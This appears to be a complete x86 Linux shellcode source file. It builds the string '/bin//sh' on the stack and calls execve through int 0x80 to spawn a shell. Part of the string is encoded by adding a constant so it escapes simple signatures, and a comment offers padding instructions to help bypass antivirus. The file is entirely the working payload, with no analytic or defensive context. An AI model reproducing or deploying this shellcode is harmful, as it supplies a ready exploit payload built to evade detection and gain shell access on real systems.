global _start

section .text
; Can use The follow depending on buffer size
; to assist in bypassing av 
; set / clear / complement carry flag
;	clc
;	stc
;	cmc
;	nop


_start:
	; PUSH the first null dword
	mov ebx, eax
	xor eax, ebx

	mov dword [esp-4], eax
	sub esp, 4

	mov esi, 0x57621e1e
	add esi, 0x11111111
	mov dword [esp-4], esi

	mov dword [esp-8], 0x6e69622f
	sub esp, 8

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
